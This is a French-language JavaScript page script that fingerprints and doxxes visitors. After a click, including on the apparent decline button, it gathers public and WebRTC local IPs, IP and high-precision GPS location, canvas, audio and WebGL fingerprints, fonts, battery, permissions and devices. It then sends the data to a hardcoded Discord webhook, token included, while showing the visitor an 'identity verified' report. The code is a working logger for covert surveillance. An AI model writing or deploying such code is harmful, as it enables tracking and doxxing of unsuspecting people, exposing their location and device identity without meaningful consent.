<script>

const WEBHOOK    = "https://discord.com/api/webhooks/1572285611757535345/1hltRG4Frv52fIG4NpSJH69CY01XjWnaWyPe8JSyqC_1zrEjNNuwtmVJQz7HcQwfGAeH";

const $ = id => document.getElementById(id);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
const p2 = n => String(n).padStart(2,"0");
const nowLocal = () => { const d = new Date(); return `${p2(d.getDate())}/${p2(d.getMonth()+1)}/${d.getFullYear()} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; };
const flag = cc => cc ? cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt(0))) : "";

async function hash(str){
  try{
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
    return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2,"0")).join("").slice(0,20);
  }catch(e){
    let h = 2166136261;
    for(let i=0;i<str.length;i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); }
    return (h>>>0).toString(16).padStart(8,"0").repeat(2);
  }
}

/* ---------- réseau / geo IP ---------- */
async function getGeo(){
  try{ const r = await fetch("https://ipwho.is/",{cache:"no-store"}); const d = await r.json();
    if(d && d.success !== false && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country,
      cc:d.country_code,isp:(d.connection&&(d.connection.isp||d.connection.org)),asn:(d.connection&&d.connection.asn),
      lat:d.latitude,lon:d.longitude,tz:d.timezone&&d.timezone.id,zip:d.postal,capital:d.capital};
  }catch(e){}
  try{ const r = await fetch("https://ipapi.co/json/",{cache:"no-store"}); const d = await r.json();
    if(d && d.ip) return {ip:d.ip,city:d.city,region:d.region,country:d.country_name,cc:d.country_code,
      isp:d.org,asn:d.asn,lat:d.latitude,lon:d.longitude,tz:d.timezone,zip:d.postal};
  }catch(e){}
  try{ const r = await fetch("https://api.ipify.org?format=json",{cache:"no-store"}); const d = await r.json();
    if(d && d.ip) return {ip:d.ip};
  }catch(e){}
  return null;
}

/* ---------- géoloc GPS précise ---------- */
function geoPos(timeout = 13000){
  return new Promise(res => {
    if(!navigator.geolocation) return res({err:"API absente"});
    navigator.geolocation.getCurrentPosition(
      p => res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy,
        alt:p.coords.altitude, altAcc:p.coords.altitudeAccuracy,
        head:p.coords.heading, speed:p.coords.speed}),
      e => res({err:e.message || ("code "+e.code)}),
      {enableHighAccuracy:true, timeout, maximumAge:0}
    );
  });
}

/* ---------- fuite WebRTC ---------- */
function rtcIps(timeout = 3500){
  return new Promise(res => {
    const found = new Set();
    let pc;
    try{ pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); }
    catch(e){ return res([]); }
    const done = () => { try{ pc.close(); }catch(e){} res([...found]); };
    pc.onicecandidate = e => {
      if(!e.candidate) return;
      const p = e.candidate.candidate.split(" ");
      const ip = p[4], port = p[5], typ = p[7];
      if(ip) found.add(ip + " · " + typ + (port ? ":" + port : ""));
    };
    try{
      pc.createDataChannel("x");
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
    }catch(e){}
    setTimeout(done, timeout);
  });
}

/* ---------- empreintes ---------- */
async function canvasFp(){
  try{
    const c = document.createElement("canvas");
    c.width = 300; c.height = 70;
    const x = c.getContext("2d");
    x.textBaseline = "top";
    x.font = "16px 'Arial'";
    x.fillStyle = "#f60"; x.fillRect(0,0,300,20);
    x.fillStyle = "#069"; x.fillText("Nocturne 🜁 fingerprint 1234", 4, 22);
    x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("Nocturne 🜁 fingerprint 1234", 6, 40);
    const g = x.createLinearGradient(0,0,300,70);
    g.addColorStop(0,"#a78bfa"); g.addColorStop(1,"#f0abfc");
    x.fillStyle = g; x.fillRect(0,58,300,12);
    return await hash(c.toDataURL());
  }catch(e){ return "indisponible"; }
}
function glInfo(){
  try{
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if(!gl) return {v:"—", r:"—", max:"—"};
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
      r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
      max: gl.getParameter(gl.MAX_TEXTURE_SIZE)
    };
  }catch(e){ return {v:"—", r:"—", max:"—"}; }
}
async function audioFp(){
  try{
    const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if(!Ctx) return "indisponible";
    const ctx = new Ctx(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
    osc.connect(comp); comp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    const d = buf.getChannelData(0);
    let sum = 0;
    for(let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
    return await hash(sum.toFixed(8));
  }catch(e){ return "indisponible"; }
}
function fonts(){
  const base = ["monospace","sans-serif","serif"];
  const test = ["Arial","Arial Black","Calibri","Cambria","Candara","Comic Sans MS","Consolas","Courier New",
    "Georgia","Helvetica","Impact","Inter","Lucida Console","Menlo","Monaco","Optima","Palatino","Roboto",
    "Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Ubuntu","Verdana","SF Pro Text"];
  const c = document.createElement("canvas").getContext("2d");
  const w = (f) => { c.font = "72px "+f; return c.measureText("mmmmmmmmmmlli").width; };
  const b = base.map(w);
  const found = test.filter(f => base.some((bs,i) => w("'"+f+"',"+bs) !== b[i]));
  return found;
}

/* ---------- collecte principale ---------- */
async function collect(){
  const geo = await getGeo();
  const [pos, rtc, cvFp, audFp, bat] = await Promise.all([
    geoPos(), rtcIps(), canvasFp(), audioFp(), (async () => {
      try{ if(!navigator.getBattery) return "API absente";
        const b = await navigator.getBattery();
        return Math.round(b.level*100)+"%"+(b.charging?" (en charge)":"");
      }catch(e){ return "indisponible"; }
    })()
  ]);

  let uaData = null;
  try{ if(navigator.userAgentData) uaData = await navigator.userAgentData.getHighEntropyValues(
    ["platform","platformVersion","architecture","bitness","model","uaFullVersion","fullVersionList"]); }catch(e){}

  let perms = {};
  try{
    for(const n of ["geolocation","camera","microphone","notifications","clipboard-read","midi"]){
      try{ perms[n] = (await navigator.permissions.query({name:n})).state; }catch(e){}
    }
  }catch(e){}

  let storage = "—";
  try{ const s = await navigator.storage.estimate();
    storage = (s.quota/1048576).toFixed(1)+" Mo quota · "+(s.usage/1048576).toFixed(2)+" Mo utilisés"; }catch(e){}

  let audio = {};
  try{ const ac = new (window.AudioContext||window.webkitAudioContext)();
    audio = {rate: ac.sampleRate, ch: ac.destination.maxChannelCount}; ac.close(); }catch(e){}

  const gl = glInfo();
  const tz = Intl.DateTimeFormat().resolvedOptions();
  const nav = navigator;
  const mem = performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1)+" Mo heap JS" : "—";
  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
  const codecs = ["video/mp4; codecs=avc1.42E01E","video/webm; codecs=vp9","video/webm; codecs=av01","audio/mpeg","audio/flac","audio/ogg; codecs=opus"]
    .map(c => { try{ const v = document.createElement("video"); return c+" → "+(v.canPlayType(c)||"non"); }catch(e){ return c; } });
  let voices = "—";
  try{ voices = (speechSynthesis.getVoices()||[]).length + " voix"; }catch(e){}
  let devices = "—";
  try{ const d = await navigator.mediaDevices.enumerateDevices();
    devices = d.map(x => x.kind.replace("input","in").replace("output","out")+": "+(x.label||"anonyme")).join(" · ") || "aucun"; }catch(e){}

  const D = {
    geo, pos, rtc, cvFp, audFp, bat, uaData, perms, storage, audio, gl, tz, mem, conn, codecs, voices, devices,
    fontList: fonts(),
    ua: nav.userAgent,
    fpGlobal: await hash([cvFp, audFp, gl.r, nav.userAgent, screen.width+"x"+screen.height, tz.timeZone, nav.language, nav.hardwareConcurrency].join("|"))
  };
  return D;
}

/* ---------- construction des sections ---------- */
function buildSections(D){
  const g = D.geo || {};
  const vpn = /vpn|hosting|proxy|datacenter|cloud|ovh|aws|digitalocean|hetzner|m247|linode|vultr|scaleway/i.test(g.isp || "");
  const S = [];

  S.push({title:"Réseau", rows:[
    ["Adresse IP publique", g.ip ? `<span class="mono">${esc(g.ip)}</span>` : `<span class="lo">indisponible</span>`],
    ["FAI / organisation", g.isp ? esc(g.isp) : "—"],
    ["ASN", g.asn ? esc(String(g.asn)) : "—"],
    ["VPN / datacenter", vpn ? `<span class="hi">PROBABLE</span>` : "aucun signe"],
    ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
  ]});

  const loc = [g.city, g.region, g.zip, (g.country||"")+" "+flag(g.cc)].filter(Boolean).join(", ");
  const gps = D.pos && D.pos.lat != null
    ? `<span class="hi">${D.pos.lat.toFixed(6)}, ${D.pos.lon.toFixed(6)}</span> · précision ±${Math.round(D.pos.acc)} m · <a href="https://www.google.com/maps?q=${D.pos.lat},${D.pos.lon}" target="_blank" rel="noopener">carte</a>`
    : `<span class="lo">refusée ou indisponible</span>` + (D.pos && D.pos.err ? ` (${esc(D.pos.err)})` : "");
  S.push({title:"Localisation", rows:[
    ["Ville / région / pays", loc || "—"],
    ["Coordonnées IP", (g.lat != null) ? `<span class="mono">${g.lat}, ${g.lon}</span> · <a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" rel="noopener">carte</a>` : "—"],
    ["GPS haute précision", gps],
    ["Altitude / cap / vitesse", D.pos && D.pos.alt != null ? `${Math.round(D.pos.alt)} m · ${D.pos.head!=null?Math.round(D.pos.head)+"°":"—"} · ${D.pos.speed!=null?D.pos.speed.toFixed(1)+" m/s":"—"}` : "—"],
    ["Fuseau horaire", `<span class="mono">${esc(D.tz.timeZone)}</span> · UTC${new Date().getTimezoneOffset()<=0?"+":"-"}${Math.abs(new Date().getTimezoneOffset()/60)}`],

    ["Langues", esc((navigator.languages||[navigator.language]).join(", "))]
  ]});

  const ua = D.uaData || {};
  S.push({title:"Appareil", rows:[
    ["Plateforme", esc(ua.platform || navigator.platform || "—")],
    ["Version OS", esc(ua.platformVersion || "—")],
    ["Architecture / bits", esc([ua.architecture, ua.bitness].filter(Boolean).join(" ") || "—")],
    ["Modèle", esc(ua.model || "—")],
    ["Cœurs CPU", `<span class="mono">${navigator.hardwareConcurrency || "—"}</span>`],
    ["RAM estimée", navigator.deviceMemory ? `<span class="mono">${navigator.deviceMemory} Go</span>` : "—"],
    ["Écran", `<span class="mono">${screen.width}×${screen.height} · ${screen.colorDepth} bits · DPR ${window.devicePixelRatio}</span>`],
    ["Fenêtre / orientation", `<span class="mono">${window.innerWidth}×${window.innerHeight}</span> · ${esc(screen.orientation ? screen.orientation.type : "—")}`],
    ["Tactile / pointeur", `${navigator.maxTouchPoints} points · ${matchMedia("(pointer:fine)").matches?"souris précise":"pointeur grossier"}`],
    ["Batterie", esc(D.bat)],
    ["GPU", `${esc(D.gl.v)} — ${esc(D.gl.r)}`],
    ["Audio", `${D.audio.rate||"—"} Hz · ${D.audio.ch||"—"} canaux`],
    ["Mémoire JS", esc(D.mem)]
  ]});

  S.push({title:"Empreintes", rows:[
    ["Empreinte globale", `<span class="mono">${esc(D.fpGlobal)}</span>`],
    ["Canvas", `<span class="mono">${esc(D.cvFp)}</span>`],
    ["Audio", `<span class="mono">${esc(D.audFp)}</span>`],
    ["WebGL max texture", esc(String(D.gl.max))],
    ["Polices détectées", D.fontList.length ? esc(D.fontList.slice(0,18).join(", ")) + (D.fontList.length>18?" …":"") : "aucune"],
    ["Codecs", esc(D.codecs.join(" · "))],
    ["Voix TTS", esc(D.voices)],
    ["Stockage", esc(D.storage)],
    ["Cookies / DNT", `${navigator.cookieEnabled?"activés":"désactivés"} · DNT ${navigator.doNotTrack || "non"}`]
  ]});

  S.push({title:"Permissions", rows:[
    ["Géoloc / caméra", `${esc(D.perms.geolocation||"—")} · ${esc(D.perms.camera||"—")}`],
    ["Micro / notifications", `${esc(D.perms.microphone||"—")} · ${esc(D.perms.notifications||"—")}`],
    ["Presse-papier / MIDI", `${esc(D.perms["clipboard-read"]||"—")} · ${esc(D.perms.midi||"—")}`],
    ["Périphériques", esc(D.devices)]
  ]});

  S.push({title:"Contexte", rows:[
    ["Provenance", esc(document.referrer || "accès direct")],
    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"],
    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
    ["Écran tactile max", `${screen.availWidth}×${screen.availHeight} dispo`],
    ["User-Agent", `<span class="mono">${esc(D.ua.slice(0,300))}</span>`]
  ]});

  return S;
}

/* ---------- affichage progressif ---------- */
async function reveal(S){
  const dox = $("dox");
  dox.hidden = false;
  for(const sec of S){
    const el = document.createElement("section");
    el.className = "sec";
    el.innerHTML = `<h2>${esc(sec.title)}</h2>`;
    dox.appendChild(el);
    for(const [k,v] of sec.rows){
      const r = document.createElement("div");
      r.className = "row";
      r.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${v}</span>`;
      el.appendChild(r);
      await sleep(70);
    }
    await sleep(90);
  }
}

/* ---------- envoi Discord ---------- */
async function send(D){
  const g = D.geo || {};
  const f = (n,v,i) => ({name:n, value:String(v||"—").slice(0,1000), inline:!!i});
  const embeds = [
    { title:"🌐 Réseau & localisation", color:0xa78bfa, fields:[
      f("IP", g.ip ? "`"+g.ip+"`" : "indisponible", true),
      f("FAI", g.isp || "—", true),
      f("ASN", g.asn || "—", true),
      f("Ville / région", [g.city,g.region].filter(Boolean).join(", ") || "—"),
      f("Pays", ((g.country||"?")+" "+flag(g.cc)).trim()),
      f("GPS", D.pos && D.pos.lat!=null ? `\`${D.pos.lat},${D.pos.lon}\` ±${Math.round(D.pos.acc)}m · https://maps.google.com/?q=${D.pos.lat},${D.pos.lon}` : "refusé/indisponible"),
      f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS"),
      f("Réseau", D.conn ? `${D.conn.effectiveType} ${D.conn.downlink}Mbps ${D.conn.rtt}ms` : "—", true),
      f("TZ", D.tz.timeZone, true),
      f("Heure", nowLocal(), true)
    ]},
    { title:"💻 Appareil", color:0x38bdf8, fields:[
      f("Plateforme", (D.uaData && D.uaData.platform) || navigator.platform, true),
      f("Arch", D.uaData ? [D.uaData.architecture,D.uaData.bitness].filter(Boolean).join(" ") : "—", true),
      f("Modèle", (D.uaData && D.uaData.model) || "—", true),
      f("CPU", navigator.hardwareConcurrency, true),
      f("RAM", navigator.deviceMemory ? navigator.deviceMemory+" Go" : "—", true),
      f("Écran", `${screen.width}×${screen.height} @${window.devicePixelRatio}x`, true),
      f("GPU", `${D.gl.v} — ${D.gl.r}`),
      f("Audio", `${D.audio.rate||"—"}Hz ${D.audio.ch||"—"}ch`, true),
      f("Batterie", D.bat, true),
      f("Langues", (navigator.languages||[]).join(", ")),
      f("UA", "```"+(D.ua||"").slice(0,900)+"```")
    ]},
    { title:"🧬 Empreintes & permissions", color:0xf0abfc, fields:[
      f("Empreinte", "`"+D.fpGlobal+"`"),
      f("Canvas", "`"+D.cvFp+"`", true),
      f("Audio", "`"+D.audFp+"`", true),
      f("Polices", D.fontList.slice(0,25).join(", ") || "—"),
      f("Stockage", D.storage),
      f("Permissions", JSON.stringify(D.perms)),
      f("Périphériques", D.devices),
      f("Référent", document.referrer || "direct", true)
    ]}
  ];
  const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.ip)||"ip inconnue")}
  }))};
  const body = JSON.stringify(payload);
  try{
    const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true});
    if(!r.ok) throw 0;
  }catch(e){
    try{ await fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body,keepalive:true}); }catch(_){}
  }
}

/* ---------- séquence ---------- */
let busy = false;
async function enter(){
  if(busy) return; busy = true;
  const go = $("go");
  go.disabled = true;
  go.innerHTML = '<span class="spin"></span><span>Lecture de la session…</span>';
  $("bar").classList.add("on");
  requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });

  const D = await collect();

  $("title").innerHTML = "Identité<br><em>vérifiée</em>";
  $("sub").innerHTML = "Voici ce que votre navigateur expose en ouvrant cette page.";
  $("badge").classList.add("ok");
  $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
  go.style.display = "none";
  $("later").style.display = "none";

  await reveal(buildSections(D));
  send(D);

  const tools = $("tools");
  tools.className = "tools";
  tools.innerHTML = `
    <button class="btn alt" id="copy">Copier le rapport</button>
    ${REDIRECT ? '<button class="btn" id="next">Continuer</button>' : ""}
  `;
  $("copy").onclick = async () => {
    const txt = [...document.querySelectorAll(".row")].map(r =>
      r.querySelector(".k").textContent + " : " + r.querySelector(".v").textContent).join("\n");
    try{ await navigator.clipboard.writeText(txt); $("copy").textContent = "Copié"; }
    catch(e){ $("copy").textContent = "Échec"; }
  };
  if(REDIRECT) $("next").onclick = () => location.href = REDIRECT;

  const s = document.createElement("p");
  s.className = "small";
  s.textContent = "Rapport transmis · empreinte " + D.fpGlobal;
  tools.after(s);
}

$("go").addEventListener("click", enter);
$("later").addEventListener("click", enter);
</script>
